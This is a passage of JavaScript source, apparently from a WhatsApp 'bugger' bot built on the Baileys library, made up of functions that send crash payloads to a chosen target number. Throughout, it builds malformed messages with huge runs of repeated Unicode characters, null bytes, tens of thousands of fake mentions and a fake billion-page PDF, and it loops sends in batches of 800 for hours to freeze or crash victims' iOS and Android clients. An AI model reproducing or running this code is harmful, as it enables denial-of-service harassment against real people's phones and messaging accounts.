      streamingSidecar: "ifzqbbi6VQrr2qWUVcibCLLD5MublGIUI7VQWllrtSH0Oy9Oom8Fsw==",
      thumbnailDirectPath: "/v/t62.36147-24/597931020_1114136300619238_2132267882477762526_n.enc?ccb=11-4&oh=01_Q5Aa3QE3WwujMWlYXtHm0OsWvWU7G2iNPANw9Cpt64aOcOvNrg&oe=695F14B4&_nc_sid=5e03e0",
      thumbnailSha256: "ewOlFHMaQjWVM2MIHgdLESHC9lTe8wqHoRl5StiLkhM=",
      thumbnailEncSha256: "Vf7tqUV/U7cF064u4mVf9/b78ud+Ds3OS2AUwPOs5xE=",
      annotations: [
        {
          polygonVertices: [
            {
              x: 0.04808333143591881,
              y: 0.3758828043937683
            },
            {
              x: 0.9397777915000916,
              y: 0.3758828043937683
            },
            {
              x: 0.9397777915000916,
              y: 0.6241093873977661
            },
            {
              x: 0.04808333143591881,
              y: 0.6241093873977661
            }
          ],
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMessage: {
              stanzaId: "AC2FA3391836A5F431C9048A1146D3B5",
              message: {
                extendedTextMessage: {
                  text: "7eppeli.pdf",
                  previewType: "NONE",
                  inviteLinkGroupTypeV2: "DEFAULT"
                },
                messageContextInfo: {
                  messageSecret: "/M7rquUfS6CESB44pG4gkIEnJXmWCj0TWplGd5anYpI=",
                  messageAssociation: {
                    associationType: 16,
                    parentMessageKey: {
                      remoteJid: target,
                      fromMe: false,
                      id: "AC911EFEDA42DEA4586C4BB8C2814563",
                      participant: XeonBotInc.user.id
                    }
                  }
                }
              }
            }
          },
          embeddedAction: true
        },
        {
          polygonVertices: [
            {
              x: 0.2779604196548462,
              y: 0.3697652220726013
            },
            {
              x: 0.6993772983551025,
              y: 0.43257278203964233
            },
            {
              x: 0.6015534996986389,
              y: 0.6402503848075867
            },
            {
              x: 0.180136576294899,
              y: 0.5774427652359009
            }
          ],
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "1906813674047253",
              songId: "1137812656623908",
              author: "𑲱👁‍🗨꙰⃟".repeat(10000),
              title: "𑲱👁‍🗨꙰⃟".repeat(10000),
              artworkDirectPath: "/v/t62.76458-24/598391103_3273009980213184_2759326202399655865_n.enc?ccb=11-4&oh=01_Q5Aa3QGnx-UJjjZjgAcBWAO2Z_fjAVSkr6_6Trx2fPX0bUWq_Q&oe=695F194E&_nc_sid=5e03e0",
              artworkSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
              artworkEncSha256: "RxkYiV5YBTTkodlBT20qVHazbrBipHBCLb5t9BWuaXo=",
              artistAttribution: "https://t.me/YuukeyD7eppeli",
              countryBlocklist: "UlU=",
              isExplicit: true,
              artworkMediaKey: "GuNInntcRnyNiYcZ28Ym4g8OeZz7JbNBHl6tPOL5BBA="
            }
          },
          embeddedAction: true
        }
      ]
    }
  }, { 
    participant: { jid:target }
  })
}

//==============================================================\\    

 async function loading(from) {
    {
        console.error("Invalid  from  JID:", from);
        return;
    }
    const Floading = [
        "ℓσα∂ιηg.",
        "ℓσα∂ιηg..",
        "ℓσα∂ιηg..."
    ];
    let { key } = await XeonBotInc.sendMessage(from, { text: " " });
    for (let i = 0; i < Floading.length; i++) {
        await XeonBotInc.sendMessage(from, { text: Floading[i], edit: key });
    }
}   

    async function sendMessagesForDurationX(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer(X); // Using X from user input
            count++;
            await sendNext(); // Continue shipping
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log completed sending 800 packages
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};

async function sendMessagesForDuration(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer2(X); // Using X from user input
            count++;
            await sendNext(); // Continue delivery without delay between messages
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log selesai kirim 800 paket
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};   
//==============================================================\\
async function albumbuggers1(target, mention) {

  const imageCrash = "https://files.catbox.moe/ykvioj.jpg";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: XeonBotInc.waUploadToServer
  });

  await XeonBotInc.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: XeonBotInc.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 30000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "5521992999999@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "ꦽ".repeat(9999),
            phoneNumber: "+5521992999999"
        }
      },
      {
          type: "url",
          urlButton: {
            displayText: "ꦽ".repeat(9999),
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(66666))
        }
      },
      {
          type: "unknown_type",
          weirdButton: {
            displayText: "ꦽ".repeat(9999),
            payload: "\u0000".repeat(9999)
        }
      },
    ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
          params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(9999) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await XeonBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function albumbuggers2(target, mention) {
  const imageCrash = "https://files.catbox.moe/ykvioj.jpg";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: XeonBotInc.waUploadToServer
  });

  await XeonBotInc.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: XeonBotInc.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 40000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "5521992999999@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: target,
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "ꦽ".repeat(9999),
            phoneNumber: "+5521992999999"
          }
        },
        {
          type: "url",
          urlButton: {
            displayText: "ꦽ".repeat(9999),
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(66666))
          }
        },
        {
          type: "unknown_type",
          weirdButton: {
            displayText: "ꦽ".repeat(9999),
            payload: "\u0000".repeat(9999)
          }
        }
      ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
        params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(9999) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };

    await XeonBotInc.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    if (mention) {
      await XeonBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

//==============================================================\\

async function iosLx(target) {
  for(let z = 0; z < 100; z++) {
    await XeonBotInc.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: `🧪⃟꙰。⌁𝟕𝐞𝐩 𝐩𝐞𝐥 ⃰𝐢. - 𝐄𝐱𝐩𝐨𝐬𝐞𝐝` + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/YuukeyD7eppeli",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: ZeppImg, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
    await sleep(9000);
  }
}
    
async function xiosinv(target){
tmsg = await generateWAMessageFromContent(target, {
               viewOnceMessage: {
                   message: {
                       listResponseMessage: {
                           title: '@HAKERAHMED2\n',
                           description:"\n\n\n"+"𑪆".repeat(260000),
                           singleSelectReply: {
                               selectedId: "id"
                           },
                           listType: 1
                       }
                   }
               }
       }, {});

await XeonBotInc.relayMessage("status@broadcast", tmsg.message, {
           messageId: tmsg.key.id,
           statusJidList: [target],
           additionalNodes: [{
               tag: "meta",
               attrs: {},
               content: [{
                   tag: "mentioned_users",
                   attrs: {},
                   content: [{
                       tag: "to",
                       attrs: { jid: target },
                       content: undefined,
                   }],
               }],
           }],
  });
}
       
async function xeonIosInvi(isTarget) {
await XeonBotInc.sendMessage(isTarget, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ Telegram ::  13 ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ Telegram ::  13 ⛧`,
body: `Haii`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/ `
}
}
}, {})
}

async function crashiosx(target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      contactMessage: {
        displayName:
          "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
          "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );

  await XeonBotInc.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );        
}

//==============================================================\\
      
async function forcer(isTarget){
	const rajaXeon = {
  key: {
    remoteJid: '120363401744741900@g.us',
    fromMe: true,
    id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
    participant: '967774772074@s.whatsapp.net'
  },
  messageTimestamp: 1753786706,
  pushName: 'Telegram: @HAKERAHMED2',
  broadcast: false,
  status: 2,
  message: {
    conversation: 'Telegram: @HAKERAHMED2',
    messageContextInfo: {
      messageSecret: new Uint8Array([
        123, 153, 59, 66, 69, 1, 31, 219,
        233, 201, 204, 107, 149, 77, 233, 100,
        80, 15, 30, 192, 133, 13, 171, 48,
        44, 27, 61, 135, 73, 149, 172, 105
      ])
    }
  },
  id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
  isBaileys: false,
  chat: '120363401744741900@g.us',
  fromMe: true,
  isGroup: true,
  sender: '967774772074@s.whatsapp.net',
  participant: '967774772074@s.whatsapp.net',
  mtype: 'conversation',
  msg: 'Telegram: @HAKERAHMED2',
  body: 'Telegram: @HAKERAHMED2',
  quoted: null,
  mentionedJid: [],
  text: 'Telegram: @HAKERAHMED2',
  reply: function() {}, // Placeholder for function
  copy: function() {}, // Placeholder for function
  copyNForward: function() {} // Placeholder for function
};
	await XeonBotInc.relayMessage(
    isTarget,
    {
      locationMessage: {
        degreesLatitude: 'Telegram: @HAKERAHMED2',
        degreesLongitude: 'Telegram: @HAKERAHMED2',
        name: `Telegram: @HAKERAHMED2`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: sender,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363274419284848@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug
          },
          externalAdReply: {
            title: ' Telegram: @HAKERAHMED2 ',
            body: 'Telegram: @HAKERAHMED2',
            mediaType: 0,
            thumbnail: rajaXeon,
            jpegThumbnail: rajaXeon,
            mediaUrl: `https://www.youtube.com/@ `,
            sourceUrl: `https://www.youtube.com/@ `
          }
        }
      }
    },
    {
      participant: {
        jid: isTarget
      }
    },
    {
      messageId: null
    }
);
	
	}

async function forcergp(isTarget){
	const rajaXeon = {
  key: {
    remoteJid: '120363401744741900@g.us',
    fromMe: true,
    id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
    participant: '967774772074@s.whatsapp.net'
  },
  messageTimestamp: 1753786706,
  pushName: 'Telegram: @HAKERAHMED2',
  broadcast: false,
  status: 2,
  message: {
    conversation: 'Telegram: @HAKERAHMED2',
    messageContextInfo: {
      messageSecret: new Uint8Array([
        123, 153, 59, 66, 69, 1, 31, 219,
        233, 201, 204, 107, 149, 77, 233, 100,
        80, 15, 30, 192, 133, 13, 171, 48,
        44, 27, 61, 135, 73, 149, 172, 105
      ])
    }
  },
  id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
  isBaileys: false,
  chat: '120363401744741900@g.us',
  fromMe: true,
  isGroup: true,
  sender: '967774772074@s.whatsapp.net',
  participant: '967774772074@s.whatsapp.net',
  mtype: 'conversation',
  msg: 'Telegram: @HAKERAHMED2',
  body: 'Telegram: @HAKERAHMED2',
  quoted: null,
  mentionedJid: [],
  text: 'Telegram: @HAKERAHMED2',
  reply: function() {}, // Placeholder for function
  copy: function() {}, // Placeholder for function
  copyNForward: function() {} // Placeholder for function
};
	await XeonBotInc.relayMessage(
    isTarget,
    {
      locationMessage: {
        degreesLatitude: 'Telegram: @HAKERAHMED2',
        degreesLongitude: 'Telegram: @HAKERAHMED2',
        name: `Telegram: @HAKERAHMED2`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: sender,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363274419284848@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug
          },
          externalAdReply: {
            title: ' Telegram: @HAKERAHMED2 ',
            body: 'Telegram: @HAKERAHMED2',
            mediaType: 0,
            thumbnail: rajaXeon,
            jpegThumbnail: rajaXeon,
            mediaUrl: `https://www.youtube.com/@ `,
            sourceUrl: `https://www.youtube.com/@ `
          }
        }
      }
    },
    {
      messageId: null
    }
);	
	}
	
//==============================================================\\

async function xeonAndroSpamGp(targetNumber){
   let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ꦾ".repeat(9000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
